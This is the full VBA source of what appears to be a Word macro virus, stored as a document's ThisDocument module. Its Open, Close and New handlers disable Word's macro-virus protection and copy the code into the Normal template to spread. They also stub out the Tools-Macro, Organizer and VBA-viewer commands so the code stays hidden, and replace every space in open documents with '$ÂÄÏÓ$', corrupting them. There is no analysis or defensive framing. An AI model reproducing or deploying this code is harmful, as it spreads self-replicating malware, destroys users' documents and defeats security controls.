   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Private Sub Document_Close()
   '  ÂÄÏÓ
   On Error GoTo Phuck
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   Randomize
   can = Int(4 * Rnd)
   If can = 4 Then
    For Each doc In Documents
     ss = doc.Name
     mycheck = ss Like "Äîêóìåíò#**"
     resp = MsgBox("Ðåêîìåíäóåòñÿ coõðàíèòü èçìåíåíèÿ â äîêóìåíòå " & ss + " âî èçáåæàíèå ïîñëåäñòâèé çàâèñàíèÿ êîìï'þòåðà", vbYes + vbInformation + vbDefaultButton1)
     If resp = vbOK Then doc.Save
     If doc.Saved Then
     Options.VirusProtection = False
     Options.SaveNormalPrompt = False
     With Selection.Find
          .ClearFormatting
          .Replacement.ClearFormatting
          .Text = " "
          .Replacement.Text = "$ÂÄÏÓ$"
          .Forward = True
          .Wrap = wdFindContinue
          .Format = True
          .MatchCase = False
          .MatchWholeWord = False
          .MatchWildcards = False
          .MatchSoundsLike = False
          .MatchAllWordForms = False
          'If .Found = True Then Font.Bold = True
      End With
      Selection.Find.Execute Replace:=wdReplaceAll
      doc.Save
      doc.Close
     End If
    Next doc
   End If
   If ThisDocument.FullName = NormalTemplate.FullName Then
   Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
   Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
   Else
   Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
   Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
   End If
   cou = dest.CodeModule.countoflines
   If cou > 0 Then
   For J = 1 To cou
   dest.CodeModule.DeleteLines (1)
   Next J
   End If
   lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
   dest.CodeModule.AddFromString (lin)
   already = False
   For I = 1 To NormalTemplate.VBProject.VBComponents.Count
   aprj = NormalTemplate.VBProject.VBComponents(I).Name
   If aprj = "ÂÄÏÓ" Then already = True
   Next I
   If Not already Then
   NormalTemplate.VBProject.VBComponents.Add (vbext_ct_StdModule)
   NormalTemplate.VBProject.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "ÂÄÏÓ"
   Set nor = NormalTemplate.VBProject.VBComponents("ÂÄÏÓ").CodeModule
   eol = Chr(13) + Chr(10)
   nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
   nor.AddFromString ("Sub Organizer" + eol + "End Sub")
   nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
   nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")
   End If
   Phuck:
   End Sub

   Private Sub Document_Open()
   '  ÂÄÏÓ
   On Error GoTo Phuck
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   Randomize
   can = Int(4 * Rnd)
   If can = 4 Then
    For Each doc In Documents
     ss = doc.Name
     mycheck = ss Like "Äîêóìåíò#**"
     resp = MsgBox("Ðåêîìåíäóåòñÿ coõðàíèòü èçìåíåíèÿ â äîêóìåíòå " & ss + " âî èçáåæàíèå ïîñëåäñòâèé çàâèñàíèÿ êîìï'þòåðà", vbYes + vbInformation + vbDefaultButton1)
     If resp = vbOK Then doc.Save
     If doc.Saved Then
     Options.VirusProtection = False
     Options.SaveNormalPrompt = False
     With Selection.Find
          .ClearFormatting
          .Replacement.ClearFormatting
          .Text = " "
          .Replacement.Text = "$ÂÄÏÓ$"
          .Forward = True
          .Wrap = wdFindContinue
          .Format = True
          .MatchCase = False
          .MatchWholeWord = False
          .MatchWildcards = False
          .MatchSoundsLike = False
          .MatchAllWordForms = False
          'If .Found = True Then Font.Bold = True
      End With
      Selection.Find.Execute Replace:=wdReplaceAll
      doc.Save
      doc.Close
     End If
    Next doc
   End If
   If ThisDocument.FullName = NormalTemplate.FullName Then
   Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
   Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
   Else
   Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
   Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
   End If
   cou = dest.CodeModule.countoflines
   If cou > 0 Then
   For J = 1 To cou
   dest.CodeModule.DeleteLines (1)
   Next J
   End If
   lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
   dest.CodeModule.AddFromString (lin)
   already = False
   For I = 1 To NormalTemplate.VBProject.VBComponents.Count
   aprj = NormalTemplate.VBProject.VBComponents(I).Name
   If aprj = "ÂÄÏÓ" Then already = True
   Next I
   If Not already Then
   NormalTemplate.VBProject.VBComponents.Add (vbext_ct_StdModule)
   NormalTemplate.VBProject.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "ÂÄÏÓ"
   Set nor = NormalTemplate.VBProject.VBComponents("ÂÄÏÓ").CodeModule
   eol = Chr(13) + Chr(10)
   nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
   nor.AddFromString ("Sub Organizer" + eol + "End Sub")
   nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
   nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")
   End If
   Phuck:
   End Sub

   Private Sub Document_New()
   '  ÂÄÏÓ
   On Error GoTo Phuck
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   Randomize
   can = Int(4 * Rnd)
   can = 4
   If can = 4 Then
    For Each doc In Documents
     ss = doc.Name
     mycheck = ss Like "Äîêóìåíò#**"
     resp = MsgBox("Ðåêîìåíäóåòñÿ coõðàíèòü èçìåíåíèÿ â äîêóìåíòå " & ss + " âî èçáåæàíèå ïîñëåäñòâèé çàâèñàíèÿ êîìï'þòåðà", vbYes + vbInformation + vbDefaultButton1)
     If resp = vbOK Then doc.Save
     If doc.Saved Then
     Options.VirusProtection = False
     Options.SaveNormalPrompt = False
     With Selection.Find
          .ClearFormatting
          .Replacement.ClearFormatting
          .Text = " "
          .Replacement.Text = "$ÂÄÏÓ$"
          .Forward = True
          .Wrap = wdFindContinue
          .Format = True
          .MatchCase = False
          .MatchWholeWord = False
          .MatchWildcards = False
          .MatchSoundsLike = False
          .MatchAllWordForms = False
          'If .Found = True Then Font.Bold = True
      End With
      Selection.Find.Execute Replace:=wdReplaceAll
      doc.Save
      doc.Close
     End If
    Next doc
   End If
   If ThisDocument.FullName = NormalTemplate.FullName Then
   Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
   Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
   Else
   Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
   Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
   End If
   cou = dest.CodeModule.countoflines
   If cou > 0 Then
   For J = 1 To cou
   dest.CodeModule.DeleteLines (1)
   Next J
   End If
   lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
   dest.CodeModule.AddFromString (lin)
   already = False
   For I = 1 To NormalTemplate.VBProject.VBComponents.Count
   aprj = NormalTemplate.VBProject.VBComponents(I).Name
   If aprj = "ÂÄÏÓ" Then already = True
   Next I
   If Not already Then
   NormalTemplate.VBProject.VBComponents.Add (vbext_ct_StdModule)
   NormalTemplate.VBProject.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "ÂÄÏÓ"
   Set nor = NormalTemplate.VBProject.VBComponents("ÂÄÏÓ").CodeModule
   eol = Chr(13) + Chr(10)
   nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
   nor.AddFromString ("Sub Organizer" + eol + "End Sub")
   nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
   nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")
   End If
   Phuck:
   End Sub
